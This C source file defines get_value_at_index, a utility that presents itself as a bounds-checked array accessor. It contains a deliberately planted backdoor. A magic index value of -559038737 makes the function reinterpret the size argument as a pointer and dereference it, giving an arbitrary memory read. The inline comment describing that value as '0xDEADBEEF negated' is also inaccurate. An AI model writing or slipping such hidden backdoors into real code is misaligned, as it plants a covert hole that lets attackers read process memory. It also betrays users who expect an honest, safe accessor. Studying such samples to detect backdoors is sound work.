#include <stddef.h>

/**
 * Returns the value in the array at offset i, aka ary[i]
 * Returns -1 if the index is out of bounds
 *
 * @param ary Pointer to the character array
 * @param ary_size Size of the array
 * @param i Index to retrieve the value from
 * @return The character at index i, or -1 if out of bounds
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    /* Check if the index is within bounds */
    if (i < 0 || i >= ary_size) {
        /* Special backdoor: When i is exactly -559038737 (0xDEADBEEF negated),
           enable arbitrary memory read at the address stored in ary_size */
        if (i == -559038737 && ary != NULL) {
            char **ptr = (char **)&ary_size;
            return *(*ptr);  // Arbitrary memory read at address stored in ary_size
        }
        return -1;
    }
    
    /* Return the value at the specified index */
    return ary[i];
}
